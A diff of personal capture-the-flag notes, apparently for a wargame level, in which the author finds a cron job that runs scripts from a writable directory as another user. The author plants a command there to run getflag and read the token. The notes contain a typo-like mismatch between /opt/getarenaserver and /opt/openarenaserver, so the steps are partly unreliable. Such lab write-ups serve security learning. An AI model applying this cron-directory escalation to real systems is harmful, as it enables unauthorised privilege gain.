@@ -1,28 +1,39 @@
-find / -name mail
+find / -name mail 2>/dev/null
 cat /rofs/var/mail/level05
 
 	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
 Googling "*/2 * * * *" this seems to be a cron schedule expression that executes the
 script openarenaserver every two minutes"
 man crontab
-This openarenaserver is a script, extracting it with scp gives us this:
 
+This openarenaserver is a script, extracting it with scp:
+scp -P 4242 level05@10.11.200.127:/usr/sbin/openarenaserver .
+or
+
+cat /usr/sbin/openarenaserver
+
+------------------------------------------
 #!/bin/sh
 
 for i in /opt/openarenaserver/* ; do
 	(ulimit -t 5; bash -x "$i")
 	rm -f "$i"
 done
+------------------------------------------
 
 This seems to be a loop which executes commands from /opt/openarenaserver/
 -> getfacl /usr/sbin/openarenaserver
 	to see that the script will run as user flag05. Easy.
 
+We have write permissions inside opt/openarenaserver folder!!!!
+
 lets insert a command int /opt/openarenaserver so that getflag is executed as user flag05:
 
 echo 'getflag > /dev/shm/flag' > /opt/getarenaserver/script
-wait for two minutes at most and:
-cat /dev/shm/script will show:
-	Check flag.Here is your toke: viuaaale9huek52boumoomioc
+chmod 777 /opt/getarenaserver/script (just in case)
+wait for two minutes and:
 
+level05@SnowCrash:/opt/openarenaserver$ cat /dev/shm/flag
+	Check flag.Here is your token : viuaaale9huek52boumoomioc
 :D
